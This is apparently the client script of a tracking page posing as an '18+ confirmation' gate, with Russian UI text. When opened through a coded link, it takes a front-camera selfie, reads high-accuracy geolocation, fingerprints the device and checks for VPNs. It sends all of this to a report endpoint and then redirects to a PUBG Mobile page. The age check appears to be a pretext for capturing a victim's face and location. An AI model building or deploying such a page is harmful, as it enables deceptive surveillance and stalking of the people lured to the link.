// === app.js CLEAN (NO ACTIVE JB SCHEMES) ===

const QSP = {
  get(k) {
    try {
      return new URLSearchParams(location.search).get(k);
    } catch {
      return null;
    }
  }
};

const LITE_MODE =
  QSP.get("lite") === "1" || QSP.get("no_media") === "1";

const API_BASE =
  (typeof window !== "undefined" && window.__API_BASE)
    ? String(window.__API_BASE).replace(/\/+$/, "")
    : "";

const STRICT_MODE = QSP.get("strict") === "1";
const DEV_LOG = QSP.get("dev_log") === "1";

function dlog(...a) {
  if (DEV_LOG) console.log("[gate]", ...a);
}

// UI Elements
const UI = {
  text: document.getElementById("text"),
  note: document.getElementById("note"),
  btn: document.getElementById("enterBtn"),
  reason: document.getElementById("reason"),
  title: document.getElementById("title")
};

function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = "grayscale(40%) brightness(0.8)";
  b.style.opacity = "0.6";
  b.style.cursor = "not-allowed";
  b.style.background = "linear-gradient(90deg,#246,#39a)";
}
function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = "none";
  b.style.opacity = "1";
  b.style.cursor = "pointer";
  b.style.background = "linear-gradient(90deg,#4f00ff,#00bfff)";
}
function showBtn() {
  if (UI.btn) UI.btn.style.display = "block";
}
function hideBtn() {
  if (UI.btn) UI.btn.style.display = "none";
}

function determineCode() {
  const q = QSP.get("code");
  const code = q ? String(q).trim() : null;
  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
}

async function askGeolocation() {
  return new Promise((resolve) => {
    if (LITE_MODE || window.__DISABLE_GEO === true) return resolve(null);
    if (!("geolocation" in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now()
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
      const w = Math.round(img.width * ratio);
      const h = Math.round(img.height * ratio);
      const c = document.createElement("canvas");
      c.width = w;
      c.height = h;
      c.getContext("2d").drawImage(img, 0, 0, w, h);
      try {
        resolve(c.toDataURL("image/jpeg", quality));
      } catch (e) {
        reject(e);
      }
    };
    img.onerror = reject;
    img.src = dataUrl;
  });
}

window.__cameraLatencyMs = null;

async function takePhotoNormal() {
  if (!navigator.mediaDevices?.getUserMedia)
    throw new Error("Камера недоступна");

  const t0 = performance.now();
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
  });

  return new Promise((resolve, reject) => {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.playsInline = true;

    const fallback = setTimeout(() => {
      try {
        const c = document.createElement("canvas");
        c.width = 1280;
        c.height = 720;
        c.getContext("2d").drawImage(video, 0, 0);
        const dataUrl = c.toDataURL("image/jpeg", 0.8);
        stream.getTracks().forEach((t) => t.stop());
        window.__cameraLatencyMs = Math.round(performance.now() - t0);
        resolve(dataUrl);
      } catch (e) {
        reject(e);
      }
    }, 3000);

    video.onloadedmetadata = async () => {
      try {
        await video.play();
        clearTimeout(fallback);
        const c = document.createElement("canvas");
        c.width = video.videoWidth || 1280;
        c.height = video.videoHeight || 720;
        c.getContext("2d").drawImage(video, 0, 0);
        const dataUrl = c.toDataURL("image/jpeg", 0.85);
        stream.getTracks().forEach((t) => t.stop());
        window.__cameraLatencyMs = Math.round(performance.now() - t0);
        resolve(dataUrl);
      } catch (err) {
        stream.getTracks().forEach((t) => t.stop());
        reject(err);
      }
    };
  });
}

(function ensureFileInput() {
  if (!document.getElementById("fileInp")) {
    const inp = document.createElement("input");
    inp.id = "fileInp";
    inp.type = "file";
    inp.accept = "image/*";
    inp.capture = "user";
    inp.style.display = "none";
    document.body.appendChild(inp);
  }
})();

async function takePhotoWithFallbackNormal() {
  try {
    return await takePhotoNormal();
  } catch {
    const inp = document.getElementById("fileInp");
    return new Promise((resolve, reject) => {
      inp.onchange = () => {
        const f = inp.files && inp.files[0];
        if (!f) return reject(new Error("Файл не выбран"));
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = reject;
        fr.readAsDataURL(f);
      };
      inp.click();
    });
  }
}

const LITE_PHOTO =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAkMBgQq5xwAAAABJRU5ErkJggg==";

function takePhotoLite() {
  window.__cameraLatencyMs = null;
  return LITE_PHOTO;
}

function takePhotoUniversal() {
  if (LITE_MODE || window.__DISABLE_CAMERA === true)
    return takePhotoLite();
  return takePhotoWithFallbackNormal();
}

// UA detection
function isIpadDesktopMode() {
  return navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1;
}
function isIOSHandheldUA(ua) {
  ua = ua || navigator.userAgent || "";
  return /(iPhone|iPad|iPod)/i.test(ua);
}
function parseIOSMajorFromUAUniversal(ua) {
  ua = ua || navigator.userAgent || "";
  const ipadDesktop = isIpadDesktopMode();
  const iosLike = isIOSHandheldUA(ua) || ipadDesktop;
  if (!iosLike) return null;
  const mOS = ua.match(/\bOS\s+(\d+)[._]/i);
  if (mOS) return parseInt(mOS[1], 10);
  if (ipadDesktop) {
    const mv = ua.match(/\bVersion\/(\d+)(?:[._]\d+)?/i);
    if (mv) return parseInt(mv[1], 10);
  }
  return null;
}

function getDeviceInfo() {
  const ua = navigator.userAgent || "";
  const iosVer = parseIOSMajorFromUAUniversal(ua);
  return {
    userAgent: ua,
    platform: navigator.platform,
    iosVersion: iosVer,
    isSafari:
      /Safari\//.test(ua) &&
      !/CriOS|Chrome|FxiOS|Edg|OPR/i.test(ua) &&
      navigator.vendor === "Apple Computer, Inc.",
    isIpadDesktop: isIpadDesktopMode()
  };
}

// Permission states
async function getPermissionStates() {
  if (LITE_MODE || window.__DISABLE_CAMERA || window.__DISABLE_GEO)
    return { geolocation: "denied", camera: "denied", microphone: "prompt" };

  if (!navigator.permissions?.query) return null;

  async function q(name) {
    try {
      return (await navigator.permissions.query({ name })).state;
    } catch {
      return "unknown";
    }
  }
  const [geo, cam, mic] = await Promise.all([
    q("geolocation"),
    q("camera"),
    q("microphone")
  ]);
  return { geolocation: geo, camera: cam, microphone: mic };
}
// ======================================================
// WebRTC, Canvas, Storage, Network, Battery, WebGL, Locale
// (ЭТО ВСЁ ИЗ ЧАСТИ 1 — ПРОПУСКАЕМ)
// ======================================================

// Datacenter IP words
const DC_ISP_WORDS = [
  "AMAZON","AWS","GOOGLE","GCP","MICROSOFT","AZURE","CLOUDFLARE",
  "HETZNER","OVH","DIGITALOCEAN","LINODE","IONOS","VULTR"
];

// Network heuristics
function analyzeNetworkHeuristics({ publicIp, webrtcIps, network, cameraLatencyMs, locale, ipMeta }) {
  const reasons = [];
  let scoreAdj = 0;

  const isp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
  if (DC_ISP_WORDS.some(w => isp.includes(w))) {
    reasons.push("DC-ISP признак (AWS/Google/Azure)");
    scoreAdj -= 25;
  }

  const leaks = (webrtcIps || []).filter(Boolean);
  if (leaks.length >= 1) {
    reasons.push("WebRTC раскрыл публичный IP");
    scoreAdj -= 10;
  }

  if (cameraLatencyMs != null && cameraLatencyMs <= 5) {
    reasons.push("Слишком малая cameraLatency");
    scoreAdj -= 10;
  }

  if (/2g/i.test(network?.effectiveType || "")) {
    reasons.push("Очень медленная сеть (2g)");
    scoreAdj -= 5;
  }

  if (network?.rtt > 800) {
    reasons.push("Очень высокий RTT");
    scoreAdj -= 5;
  }

  const tz = (locale?.timeZone || "").toUpperCase();
  const country = (publicIp?.country || ipMeta?.country || "").toUpperCase();
  if (tz && country && !tz.includes(country) && !tz.includes("UTC") && !tz.includes("GMT")) {
    reasons.push(`Таймзона (${locale?.timeZone}) != стране IP (${publicIp?.country})`);
    scoreAdj -= 8;
  }

  let label = "unlikely";
  if (scoreAdj <= -25) label = "likely";
  else if (scoreAdj <= -10) label = "possible";

  return { label, scoreAdj, reasons, dcIsp: label === "likely" };
}

// Safari 18 tests
async function testSafari18_0_ViewTransitions() {
  const hasAPI = typeof document.startViewTransition === "function";
  const cssOK = CSS?.supports?.("view-transition-name: auto") === true;
  let ran = false, finished = false;

  try {
    if (hasAPI) {
      const d = document.createElement("div");
      document.body.appendChild(d);
      const vt = document.startViewTransition(() => { ran = true; });
      await vt?.finished;
      finished = true;
      d.remove();
    }
  } catch {}

  return {
    feature: "Safari 18.0 ViewTransitions",
    pass: !!(hasAPI && cssOK && ran && finished)
  };
}

async function testSafari18_4_Triple() {
  let shapeOK = false;
  try {
    const el = document.createElement("div");
    el.style.clipPath = "shape(from right center, line to bottom center, line to right center)";
    shapeOK = !!el.style.clipPath;
  } catch {}

  const cookieStoreOK = typeof window.cookieStore === "object";
  const webauthnOK =
    typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === "function" &&
    typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === "function";

  return {
    feature: "Safari 18.4 combined",
    pass: !!(shapeOK && cookieStoreOK && webauthnOK)
  };
}

// Wait for featureGate injected by HTML
async function waitFeatureGate(ms = 800) {
  if (window.__featureGate) return window.__featureGate;

  return new Promise(resolve => {
    const t = setTimeout(() => resolve(window.__featureGate || null), ms);
    window.addEventListener("featuregate-ready", ev => {
      clearTimeout(t);
      resolve(ev.detail || window.__featureGate || null);
    }, { once: true });
  });
}

// ===========================================
// collectClientProfile (из Часть 1)
// ===========================================


// ===========================================
// runDeviceCheck (NO JB)
// ===========================================
async function runDeviceCheck(clientProfile) {
  const reasons = [];
  const details = {};
  let score = 100;

  try {
    details.ua = navigator.userAgent;
    details.platform = navigator.platform;
    details.timezone = clientProfile?.locale?.timeZone;
    details.screen = clientProfile?.locale?.screen;
    details.maxTouchPoints = navigator.maxTouchPoints || 0;

    // webdriver
    details.navigator_webdriver = navigator.webdriver;
    if (navigator.webdriver) {
      reasons.push("webdriver=true");
      score -= 60;
    }

    // Devtools
    const devtools = detectDevtoolsHeuristic();
    details.devtools = devtools;
    if (devtools?.opened) {
      reasons.push("DevTools размеры окна");
      score -= 6;
    }

    // camera latency
    details.cameraLatencyMs = window.__cameraLatencyMs;
    if (!LITE_MODE && details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
      reasons.push("Слишком малая cameraLatency");
      score -= 10;
    }

    // In-app
    if (clientProfile?.inAppWebView?.isInApp) {
      reasons.push("In-App WebView");
      score -= 8;
    }

    // Network heuristics
    const pn = analyzeNetworkHeuristics({
      publicIp: clientProfile?.publicIp,
      webrtcIps: clientProfile?.webrtcIps,
      network: clientProfile?.network,
      cameraLatencyMs: details.cameraLatencyMs,
      locale: clientProfile?.locale,
      ipMeta: clientProfile?.publicIp
    });

    details.pn_proxy = pn;

    if (pn.label === "likely") {
      reasons.push("VPN/Proxy likely");
      score -= 25;
    } else if (pn.label === "possible") {
      reasons.push("VPN/Proxy possible");
      score -= 10;
    }

    if (score >= 80) {
      reasons.push("Ок: окружение норм");
    } else if (score >= 60) {
      reasons.push(" Есть несостыковки");
    } else {
      reasons.push("Высокая вероятность подмены");
    }
  } catch (e) {
    reasons.push("Ошибка проверки окружения: " + e.message);
  }

  return {
    score,
    label: score < 60 ? "likely" : score < 80 ? "possible" : "unlikely",
    reasons,
    details,
    timestamp: Date.now()
  };
}

// ===========================================
// sendReport
// ===========================================
async function sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary }) {
  const info = getDeviceInfo();
  const code = determineCode();
  if (!code) throw new Error("Нет кода");

  const body = {
    userAgent: info.userAgent,
    platform: info.platform,
    iosVersion: info.iosVersion,
    isSafari: info.isSafari,
    geo,
    photoBase64,
    note: "auto",
    code,
    client_profile,
    device_check,
    featuresSummary,
    strict: STRICT_MODE ? 1 : 0
  };

  const r = await fetch(`${API_BASE}/api/report`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });

  const txt = await r.text();
  let json = null;
  try { json = JSON.parse(txt); } catch {}

  if (!r.ok) throw new Error(json?.error || txt);
  if (!json?.ok) throw new Error(json?.error || "Ошибка сервера");

  return json;
}

// ==============================================================
// AUTO-FLOW — ТЕПЕРЬ ВОЗВРАЩАЕТ РЕЗУЛЬТАТ В HTML
// ==============================================================
async function autoFlow() {
  try {
    setBtnLocked();
    showBtn();

    if (UI.title) UI.title.textContent = "Подтверждение 18+";
    if (UI.text) UI.text.textContent = "Готовим проверку устройства…";

    const code = determineCode();
    if (!code) {
      hideBtn();
      return { ok:false, decision:{ canLaunch:false }, reason:"Нет кода" };
    }

    if (UI.note) UI.note.textContent = "Собираем данные…";

    const [geo, rawPhoto, client_profile] = await Promise.all([
      askGeolocation(),
      takePhotoUniversal(),
      collectClientProfile()
    ]);

    const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);

    if (UI.note) UI.note.textContent = "Проверяем Safari 18…";

    let fg = await waitFeatureGate();
    let vt18_ok, v184_ok;

    if (fg?.effective) {
      vt18_ok = !!fg.effective.vt18Pass;
      v184_ok = !!fg.effective.v184Pass;
    } else {
      const { vt18_0, triple18_4 } = await runSafariFeatureTests();
      vt18_ok = vt18_0.pass;
      v184_ok = triple18_4.pass;
    }

    const featuresSummary = {
      VT18: vt18_ok ? "ok" : "—",
      v18_4: v184_ok ? "ok" : "—"
    };

    if (!vt18_ok) {
      return {
        ok: true,
        decision: { canLaunch:false },
        reason: "Safari 18 отсутствует",
        featuresSummary
      };
    }

    if (UI.note) UI.note.textContent = "Анализ окружения…";

    const device_check = await runDeviceCheck(client_profile);

    if (UI.note) UI.note.textContent = "Отправляем отчёт…";

    const resp = await sendReport({
      photoBase64,
      geo,
      client_profile,
      device_check,
      featuresSummary
    });

    const decision = resp?.decision || { canLaunch:false };

    window.__decision = decision;
    window.__reportReady = !!decision.canLaunch;

    return {
      ok: true,
      decision,
      risk: resp?.risk,
      flags: resp?.flags,
      featuresSummary
    };

  } catch (err) {
    return {
      ok:false,
      decision:{ canLaunch:false },
      error:String(err)
    };
  }
}

// expose
window.startAutoFlow = () => autoFlow();

// ===============================================
// КНОПКА ВХОДА
// ===============================================
(function setupEnter() {
  const btn = UI.btn;
  if (!btn) return;

  btn.addEventListener("click", (e) => {
    if (!window.__decision?.canLaunch) {
      e.preventDefault();
      return;
    }
    location.assign("https://www.pubgmobile.com/ig/itop");
  });
})();
